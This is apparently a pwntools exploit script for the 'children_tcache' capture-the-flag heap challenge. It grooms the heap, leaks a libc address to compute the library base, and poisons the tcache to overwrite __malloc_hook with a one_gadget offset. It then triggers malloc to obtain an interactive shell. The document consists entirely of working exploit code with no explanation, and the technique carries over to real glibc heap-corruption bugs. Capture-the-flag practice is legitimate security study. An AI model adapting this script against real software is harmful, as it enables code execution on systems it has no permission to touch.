from pwn import *
def cmd(c):
	p.sendlineafter("ice: ",str(c))
def add(size,data):
	cmd(1)
	p.sendlineafter("Size:",str(size))
	p.sendafter("Data:",data)
def show(idx):
	cmd(2)
	p.sendlineafter("Index:",str(idx))
def free(idx):
	cmd(3)
	p.sendlineafter("Index:",str(idx))

p=process("./children_tcache")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
for x in range(6):
	add(0x80,"\n")
add(0x5e0,'\n')#6
add(0x500,'\n')#7
add(0x80,'\n')#8
free(6)


add(0x18,'B'*0x18)#6
add(0x80,'\n')#9

for x in range(6):
	free(x)


free(8)
free(6)
add(0x100,'\n')#0
free(9)
free(7)
add(0x350,'\n')#1
add(0x30,'\n')#2
add(0x40,'\n')#3
show(0)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dcfca0-0x7ffff79e4000)
libc.address=base
log.warning(hex(base))
add(0x100,'\n')
free(0)
free(4)
add(0x100,p64(libc.symbols['__malloc_hook']))
add(0x100,p64(libc.symbols['__malloc_hook']))
add(0x100,p64(0x10a38c+base))
cmd(1)
p.sendline("0")
p.sendline("clear")
p.interactive("nier>>>")
